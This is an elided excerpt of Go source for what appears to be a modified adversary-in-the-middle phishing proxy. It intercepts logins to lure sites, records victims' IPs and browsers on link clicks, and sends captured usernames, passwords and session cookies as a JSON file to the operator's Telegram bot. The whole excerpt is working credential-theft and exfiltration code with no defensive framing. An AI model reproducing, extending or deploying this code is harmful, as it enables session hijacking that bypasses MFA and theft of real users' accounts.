...
type HttpProxy struct {
	...
	telegram          *Telegram
	cloudflare        bool
	telegram_chat_id  int64    // Change from string to int64
...
func (m *IpDetailsMap) ToString() string {
    return fmt.Sprintf("%s, %s, %s", m.City, m.Region, m.Country)
}
...
func NewHttpProxy(ip_addr string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool, livefeed bool, cloudflare bool, telegram *Telegram) (*HttpProxy, error) {
	p := &HttpProxy{
		cfg:         cfg,
		crt_db:      crt_db,
		db:          db,
		...
		telegram:    telegram,
		ip_whitelist: make(map[string]int64),     // Initialize the maps
		ip_sids:     make(map[string]string),
		sessions:    make(map[string]*Session),
		sids:        make(map[string]int),
	}

	// Initialize the Proxy field first
	p.Proxy = goproxy.NewProxyHttpServer()
	p.Proxy.Verbose = false

	// Then use it in the Server initialization
	p.Server = &http.Server{
		Addr:         fmt.Sprintf("%s:%d", ip_addr, port),
		Handler:      p.Proxy,
	...
	p.Proxy.OnRequest(goproxy.UrlMatches(urlPattern)).DoFunc(
		func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
			...
			if clientID != "" {
				...
				baseUrl := fmt.Sprintf("https://office.%s", baseDomain)
				
				// Read the body
				body, err := ioutil.ReadAll(req.Body)
				if err != nil {
					log.Error("redirector: %v", err)
					return req, nil
				}
				
				// Replace the template variable with actual URL
				body = bytes.Replace(
					body,
					[]byte(`var redirectUrl = "{{.RedirectUrl}}";`),
					[]byte(fmt.Sprintf(`var redirectUrl = "%s";`, baseUrl)),
					1,
				)
	...
	p.Proxy.OnRequest().
		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
			...
			if phished {
				...
				if p.handleSession(req.Host) && pl != nil {
					...
					if err == nil {
						...
						log.Warning("session cookie not found: %s (%s) [%s]", req_url, req.Header.Get("User-Agent"), pl.Name)
						...
						if (!p.cfg.IsSiteHidden(pl_name)) {
							if l != nil {
								...
								if err == nil {
										...
										if trackParam == "track" {
											...
											if ok && rid != "" {
												...
												browser := map[string]string{
													"address":      getRealIP(req),
													"orig-address": getRealIP(req), // Clean IP without port
									...
									if p.telegram == nil {
    									log.Error("telegram client is not initialized")
									} else if !p.telegram.enabled {
    									log.Error("telegram notifications are disabled")
									} else if p.telegram.bot == nil {
    									log.Error("telegram bot instance is nil")
									}
									if p.telegram != nil {
										msg := fmt.Sprintf("🔔 Link Clicked!\n"+
											"📍 IP: %s",
											remote_addr)
										err := p.telegram.SendMessage(msg)
										if err != nil {
			...
			// Then: Credentials notification with error handling
			if p.telegram != nil {
				if s, ok := p.sessions[ps.SessionId]; ok && len(s.Username) != 0 {
					// Check if the session is complete and notification hasn't been sent
					if s.IsDone && !s.notificationSent {
						// Get IP and User-Agent directly from the request
						...
						// Fallback to session data if empty
						if ip == "" && s.Browser != nil {
							ip = s.Browser["ip"]
						}
						if userAgent == "" && s.Browser != nil {
							if uaVal, exists := s.Browser["user-agent"]; exists {
								ua := user_agent.New(uaVal)
								if name, _ := ua.Browser(); name != "" {
									browserName = name
								}
							}
						...
						// Build cookies content as JSON
						jsonData := TokensToJSON(pl, s.CookieTokens)
						...
						if err == nil {
							...
							caption := fmt.Sprintf(
								...
								s.Username, s.Password, browserName,
								time.Now().Format("2006-01-02 15:04:05"), ip)

							// Send file with caption
							filename := fmt.Sprintf("%s.txt", strings.ReplaceAll(s.Username, "@", "_"))
							err = p.telegram.SendDocument(caption, filename, []byte(jsonData))
							if err != nil {
								log.Error("Failed to send cookie file: %v", err)
							} else {
								s.notificationSent = true // Mark notification as sent
							}
						} else {
			...
			if is_cookie_auth && is_body_auth && is_http_auth {
				...
				if s, ok := p.sessions[ps.SessionId]; ok {
					if !s.IsDone {
						...
						// Build cookies content
						var cookiesStr strings.Builder
						for domain, cookies := range s.CookieTokens {
							cookiesStr.WriteString(fmt.Sprintf("=== Domain: %s ===\n", domain))
							for name, cookie := range cookies {
								cookiesStr.WriteString(fmt.Sprintf("%s = %s\n", name, cookie.Value))
							}
							cookiesStr.WriteString("\n")
						}
...
// Add this helper function to format cookies
func TokensToJSON(pl *Phishlet, tokens map[string]map[string]*database.CookieToken) string {
    ...
    results, _ := json.Marshal(cookies)
...
func getBrowserInfo(req *http.Request) string {
    ua := user_agent.New(req.UserAgent())
    browserName, browserVersion := ua.Browser()
    return fmt.Sprintf("%s %s", browserName, browserVersion)
}
